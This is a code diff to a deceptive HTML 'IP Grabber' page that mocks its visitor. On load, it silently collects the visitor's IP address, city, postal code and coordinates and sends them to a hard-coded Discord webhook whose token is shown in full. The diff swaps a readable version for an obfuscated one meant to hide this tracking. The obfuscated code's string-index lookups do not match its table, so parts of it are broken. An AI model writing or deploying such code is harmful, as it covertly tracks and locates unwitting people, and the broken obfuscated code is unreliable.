@@ -1,73 +1,61 @@
-<!DOCTYPE html>  
-<html lang="en">  
-<head>  
-    <meta charset="UTF-8">  
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>IP Grabber</title>  
-    <style>  
-        body {  
-            font-family: Arial, sans-serif;  
-            text-align: center;  
-            margin-top: 50px;  
-            padding: 20px;  
-        }  
-        h1 {  
-            color: red;  
-            font-size: 2rem;  
-        }  
-        @media (max-width: 600px) {  
-            h1 {  
-                font-size: 1.5rem;  
-            }  
-        }  
-    </style>  
-</head>  
-<body>  
-    <h1>You idiot, you fell XD for it!</h1>  
-    <script>  
-        // Function to fetch the user's IP address  
-        async function getIP() {  
-            const response = await fetch('https://api.ipify.org?format=json');  
-            const data = await response.json();  
-            return data.ip;  
-        }  
-
-        // Function to get location details based on IP  
-        async function getLocation(ip) {  
-            const response = await fetch(`https://ipapi.co/${ip}/json/`);  
-            const data = await response.json();  
-            return {  
-                city: data.city,  
-                region: data.region,  
-                country: data.country_name,  
-                postal: data.postal,  
-                latitude: data.latitude,  
-                longitude: data.longitude  
-            };  
-        }  
-
-        // Function to send the IP and location to Discord  
-        async function sendToDiscord(ip, location) {  
-            const webhookURL = 'https://discord.com/api/webhooks/1335747760938287226/u5jzn2B2uVDP1VcTqy4MVRGv2cdM1EAtwN9SMynhtGmIfnwZ410vY7THaT0Qcx6NGQ4y';  
-            const message = {  
-                content: `New IP grabbed: ${ip}\nLocation: ${location.city}, ${location.region}, ${location.country}\nPostal: ${location.postal}\nCoordinates: ${location.latitude}, ${location.longitude}`  
-            };  
-
-            await fetch(webhookURL, {  
-                method: 'POST',  
-                headers: {  
-                    'Content-Type': 'application/json'  
-                },  
-                body: JSON.stringify(message)  
-            });  
-        }  
-
-        // Main function  
-        (async () => {  
-            const ip = await getIP();  
-            const location = await getLocation(ip);  
-            await sendToDiscord(ip, location);  
-        })();  
-    </script>  
-</body>  
-</html>  
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Grabber</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; padding: 20px; }
+        h1 { color: red; font-size: 2rem; }
+        @media (max-width: 600px) { h1 { font-size: 1.5rem; } }
+    </style>
+</head>
+<body>
+    <h1>You idiot, you fell XD for it!</h1>
+    <script>
+        (function() {
+            const _0x3c5b = ['ipify', 'json', 'city', 'region', 'country_name', 'postal', 'latitude', 'longitude', 'https://discord.com/api/webhooks/1335747760938287226/u5jzn2B2uVDP1VcTqy4MVRGv2cdM1EAtwN9SMynhtGmIfnwZ410vY7THaT0Qcx6NGQ4y', 'POST', 'Content-Type', 'application/json', 'New IP grabbed: ', '\nLocation: ', ', ', '\nPostal: ', '\nCoordinates: ', 'stringify'];
+            const _0x2c3d = function(_0x3c5b21, _0x2c3d21) {
+                _0x3c5b21 = _0x3c5b21 - 0x0;
+                let _0x4c5b = _0x3c5b[_0x3c5b21];
+                return _0x4c5b;
+            };
+            async function _0x1a2b() {
+                const _0x4d2c = await fetch(`https://api.${_0x2c3d('0x0')}.org?format=${_0x2c3d('0x1')}`);
+                const _0x3e4d = await _0x4d2c.json();
+                return _0x3e4d.ip;
+            }
+            async function _0x3f4a(_0x1a2b2) {
+                const _0x4d2c = await fetch(`https://ipapi.co/${_0x1a2b2}/${_0x2c3d('0x1')}`);
+                const _0x3e4d = await _0x4d2c.json();
+                return {
+                    city: _0x3e4d[_0x2c3d('0x2')],
+                    region: _0x3e4d[_0x2c3d('0x3')],
+                    country: _0x3e4d[_0x2c3d('0x4')],
+                    postal: _0x3e4d[_0x2c3d('0x5')],
+                    latitude: _0x3e4d[_0x2c3d('0x6')],
+                    longitude: _0x3e4d[_0x2c3d('0x7')]
+                };
+            }
+            async function _0x5d6e(_0x1a2b2, _0x3f4a2) {
+                const _0x4d2c = _0x2c3d('0x8');
+                const _0x3e4d = {
+                    content: _0x2c3d('0x9') + _0x1a2b2 + _0x2c3d('0xa') + _0x3f4a2[_0x2c3d('0x2')] + _0x2c3d('0xb') + _0x3f4a2[_0x2c3d('0x3')] + _0x2c3d('0xb') + _0x3f4a2[_0x2c3d('0x4')] + _0x2c3d('0xc') + _0x3f4a2[_0x2c3d('0x5')] + _0x2c3d('0xd') + _0x3f4a2[_0x2c3d('0x6')] + ', ' + _0x3f4a2[_0x2c3d('0x7')]
+                };
+                await fetch(_0x4d2c, {
+                    method: _0x2c3d('0xe'),
+                    headers: {
+                        [_0x2c3d('0xf')]: _0x2c3d('0x10')
+                    },
+                    body: JSON[_0x2c3d('0x11')](_0x3e4d)
+                });
+            }
+            (async () => {
+                const _0x1a2b2 = await _0x1a2b();
+                const _0x3f4a2 = await _0x3f4a(_0x1a2b2);
+                await _0x5d6e(_0x1a2b2, _0x3f4a2);
+            })();
+        })();
+    </script>
+</body>
+</html>
